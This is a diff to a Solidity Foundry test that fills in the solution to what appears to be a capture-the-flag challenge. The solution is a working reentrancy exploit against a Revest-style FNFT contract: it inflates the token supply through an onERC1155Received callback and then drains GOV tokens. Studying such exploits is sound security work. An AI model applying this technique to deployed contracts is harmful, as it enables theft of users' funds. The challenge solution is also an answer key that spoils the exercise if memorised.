@@ -13,6 +13,8 @@ import {FNFTHandler} from "src/degen-jackpot/FNFTHandler.sol";
 import {AddressRegistry} from "src/degen-jackpot/OtherContracts.sol";
 import {IRevest} from "src/degen-jackpot/OtherInterfaces.sol";
 
+import {DegenJackpotAttack} from "./AttackContracts/18-DegenJackpotAttack.sol";
+
 contract Testing is Test {
     address attacker = makeAddr("attacker");
     address o1 = makeAddr("o1");
@@ -26,6 +28,8 @@ contract Testing is Test {
     TokenVault tokenVault;
     FNFTHandler fnftHandler;
     AddressRegistry addressRegistry;
+
+    DegenJackpotAttack attackContract;
 
     /// preliminary state
     function setUp() public {
@@ -93,7 +97,45 @@ contract Testing is Test {
     function testChallengeExploit() public {
         vm.startPrank(attacker, attacker);
 
-        // implement solution here
+        // deploy attack contract and transfer GOV tokens to it
+        attackContract = new DegenJackpotAttack(gov, revest);
+        gov.transfer({to: address(attackContract), amount: gov.balanceOf(attacker)});
+
+        // variables for `mintAddressLock`
+        address[] memory _recipients = new address[](1);
+        _recipients[0] = address(attackContract);
+        uint256[] memory _quantities = new uint256[](1);
+        _quantities[0] = 2;
+        bytes memory _arguments;
+        IRevest.FNFTConfig memory _fnftConfig;
+        _fnftConfig.asset = address(gov);
+        _fnftConfig.depositAmount = 0;
+
+        // we mint 2 ERC1155s, each have 0 ERC20 tokens, fnftId=1 -> state vars updated: supply[1] += 2, fnftsCreated += 1
+        revest.mintAddressLock({
+            trigger: address(attackContract),
+            arguments: _arguments,
+            recipients: _recipients,
+            quantities: _quantities,
+            fnftConfig: _fnftConfig
+        });
+
+        // enable the attack contract to reenter `Revest` inside `onERC1155Received`
+        attackContract.setCallbackTrue();
+
+        // update quantites to the amount we want to steal
+        _quantities[0] = 100_001;
+
+        // fnftId=2, this time state vars updated: supply[2] += 100_001 and fnftsCreated will not be updated because we reenter first
+        revest.mintAddressLock({
+            trigger: address(attackContract),
+            arguments: _arguments,
+            recipients: _recipients,
+            quantities: _quantities,
+            fnftConfig: _fnftConfig
+        });
+
+        attackContract.getGov();
 
         vm.stopPrank();
         validation();
